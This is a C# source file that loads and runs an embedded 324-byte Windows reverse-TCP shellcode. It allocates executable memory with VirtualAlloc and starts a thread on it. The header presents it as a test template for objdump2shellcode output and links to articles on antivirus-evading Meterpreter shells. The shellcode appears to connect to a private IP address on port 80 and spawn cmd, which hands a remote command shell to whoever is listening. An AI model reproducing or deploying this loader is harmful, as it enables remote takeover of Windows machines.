/*

Executable name		: ShellcodeTestCsharp.exe
Author			: webstersprodigy.net
Visual Studio Version	: 2017
Description		: This is simply a standalone exe that will run shellcode as
			  a windows service. This template was used to test csharp's
			  formatting from objdump2shellcode.
Build Using:
	File ~> New ~> Project ~> Windows Service (.NET Framework)
	~> Name (anything) ~> OK ~> Program.cs ~> Paste ~> Build
	Build (project name) ~> Run it!

Resources:
	https://holdmybeer.xyz/2016/09/11/c-to-windows-meterpreter-in-10mins/
	https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/

*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace TCP_Process
{
    class Program
    {
        static void Main(string[] args)
        {

	    // objdump2shellcode -d win-reverse-tcp -f csharp -b "\x00" -v shellcode
            byte[] shellcode = new byte[324] {
            0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
            0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
            0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,
            0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x10,0x68,
            0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,
            0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x00,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,
            0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x01,0x01,0x8d,0x44,
            0x24,0x10,0xc6,0x00,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,
            0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,
            0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,
            0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };


            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // prepare data
            IntPtr pinfo = IntPtr.Zero;

            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId

        );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(

        string moduleName

        );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(

        IntPtr hModule,
        string procName

        );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(

        string lpFileName

        );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();

    }
}